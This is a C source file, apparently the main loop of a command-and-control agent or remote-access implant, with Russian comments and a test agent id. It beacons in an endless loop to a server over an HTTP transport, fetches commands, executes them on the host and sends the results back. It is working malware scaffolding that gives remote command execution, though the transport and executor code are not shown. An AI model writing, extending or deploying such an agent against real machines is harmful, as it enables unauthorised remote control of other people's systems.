#include "transport.h"
#include "executable.h"

#include <stdio.h>
//#include <stdlib.h>
#include <unistd.h>

//TODO:
//перед любым взаимодействием с сервером - INIT и в конце не забыть cleanup после каждого INIT!!!

int main() {
    TransportModule *active_channel = &http_transport;

    char agent_id[] = "agent_999";//for test
    
    char task_id[5] = {0};
    char command[256] = {0};
    char result[4096] = {0};

    while(1) {
        printf("Подключение к серверу...\n");
        if(active_channel->init() == 0) {
            printf("К серверу подключен...\n");
            if(active_channel->get_command(command, task_id,  sizeof(command), sizeof(task_id), agent_id) == 0) {
                active_channel->cleanup();
                execute_command(command, result, sizeof(result));
                sleep(1);
                
                //Для отправки результата
                active_channel->init();
                active_channel->send_result(task_id, result);
                active_channel->cleanup();
            } else {
                active_channel->cleanup();
                printf("[DEBUG] Задач нет.\n");
                fflush(stdout);
                sleep(1);
            }
        }
        sleep(5);
    }

    return 0;
}
